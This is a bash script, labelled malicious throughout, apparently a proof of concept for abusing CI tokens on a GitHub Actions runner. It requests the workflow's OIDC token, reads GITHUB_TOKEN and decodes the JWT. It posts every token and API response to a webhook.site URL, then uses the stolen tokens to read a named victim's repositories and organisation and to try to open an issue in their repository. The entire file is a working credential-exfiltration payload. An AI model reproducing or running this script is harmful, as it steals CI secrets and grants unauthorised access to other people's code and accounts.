#!/bin/bash
echo "[MALICIOUS] Payload executing on runner: $(hostname)"
echo "[MALICIOUS] Current directory: $(pwd)"
echo "[MALICIOUS] User: $(whoami)"
echo "[MALICIOUS] Date: $(date)"
echo ""

# ============================================================
# 1. EXFILTRATE OIDC TOKEN
# ============================================================
echo "[MALICIOUS] Step 1: Exfiltrating OIDC token..."

if [ ! -z "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
    echo "[MALICIOUS] OIDC request token found"
    
    # Get OIDC token with multiple audiences
    OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
    
    if [ ! -z "$OIDC_TOKEN" ]; then
        echo "[MALICIOUS] OIDC token exfiltrated successfully"
        
        # Send to webhook
        curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" \
             -d "oidc_token=$OIDC_TOKEN"
        
        # ============================================================
        # 2. TEST CROSS-ACCOUNT ACCESS (Victim: meowarch)
        # ============================================================
        echo ""
        echo "[MALICIOUS] Step 2: Testing cross-account access to victim (meowarch)..."
        
        # Try to access victim's repository info
        VICTIM_REPO="meowarch/vulnerable-repo"
        
        # Attempt 1: Direct API access with OIDC token
        echo "[MALICIOUS] Attempting to read victim's repository: $VICTIM_REPO"
        API_RESULT=$(curl -s -H "Authorization: Bearer $OIDC_TOKEN" \
                          -H "Accept: application/vnd.github.v3+json" \
                          "https://api.github.com/repos/$VICTIM_REPO" 2>/dev/null)
        
        if [ ! -z "$API_RESULT" ]; then
            curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" \
                 -d "github_api_result=$API_RESULT"
            echo "[MALICIOUS] API result sent to webhook"
        fi
        
        # Attempt 2: Try to list victim's repositories
        echo "[MALICIOUS] Attempting to list victim's repositories"
        REPO_LIST=$(curl -s -H "Authorization: Bearer $OIDC_TOKEN" \
                        -H "Accept: application/vnd.github.v3+json" \
                        "https://api.github.com/users/meowarch/repos" 2>/dev/null)
        
        if [ ! -z "$REPO_LIST" ]; then
            curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" \
                 -d "repo_list=$REPO_LIST"
        fi
        
        # Attempt 3: Try to read victim's organization info (if any)
        echo "[MALICIOUS] Attempting to read victim's organization"
        ORG_INFO=$(curl -s -H "Authorization: Bearer $OIDC_TOKEN" \
                       -H "Accept: application/vnd.github.v3+json" \
                       "https://api.github.com/orgs/org-a-target" 2>/dev/null)
        
        if [ ! -z "$ORG_INFO" ]; then
            curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" \
                 -d "org_info=$ORG_INFO"
        fi
        
        # Attempt 4: Try to create an issue in victim's repo (if token has write perms)
        echo "[MALICIOUS] Attempting to create issue in victim's repo (testing write access)"
        ISSUE_PAYLOAD='{"title":"Security test from OIDC token","body":"This issue was created using an exfiltrated OIDC token"}'
        ISSUE_RESULT=$(curl -s -X POST -H "Authorization: Bearer $OIDC_TOKEN" \
                           -H "Accept: application/vnd.github.v3+json" \
                           -H "Content-Type: application/json" \
                           -d "$ISSUE_PAYLOAD" \
                           "https://api.github.com/repos/$VICTIM_REPO/issues" 2>/dev/null)
        
        if [ ! -z "$ISSUE_RESULT" ]; then
            curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" \
                 -d "issue_result=$ISSUE_RESULT"
            echo "[MALICIOUS] Issue creation attempted"
        fi
        
    else
        echo "[MALICIOUS] Failed to get OIDC token"
    fi
else
    echo "[MALICIOUS] No OIDC request token available"
fi

# ============================================================
# 3. ALSO TRY GITHUB_TOKEN (if available)
# ============================================================
echo ""
echo "[MALICIOUS] Step 3: Attempting GITHUB_TOKEN exfiltration..."

if [ ! -z "$GITHUB_TOKEN" ]; then
    echo "[MALICIOUS] GITHUB_TOKEN found"
    curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" \
         -d "github_token=$GITHUB_TOKEN"
    
    # Use GITHUB_TOKEN to access victim
    GITHUB_RESULT=$(curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
                        "https://api.github.com/repos/meowarch/vulnerable-repo" 2>/dev/null)
    if [ ! -z "$GITHUB_RESULT" ]; then
        curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" \
             -d "github_token_api=$GITHUB_RESULT"
    fi
else
    echo "[MALICIOUS] GITHUB_TOKEN is empty"
fi

# ============================================================
# 4. DECODE AND SEND JWT PAYLOAD
# ============================================================
echo ""
echo "[MALICIOUS] Step 4: Decoding JWT payload..."

if [ ! -z "$OIDC_TOKEN" ]; then
    # Extract and decode the payload (second part of JWT)
    JWT_PAYLOAD=$(echo "$OIDC_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null)
    if [ ! -z "$JWT_PAYLOAD" ]; then
        curl -s -X POST "https://webhook.site/e3e39eab-0bd6-4e0e-8801-7dc8cad7b5b2" \
             -d "jwt_payload=$JWT_PAYLOAD"
        echo "[MALICIOUS] JWT payload sent"
    fi
fi

echo ""
echo "[MALICIOUS] ========== EXFILTRATION COMPLETE =========="
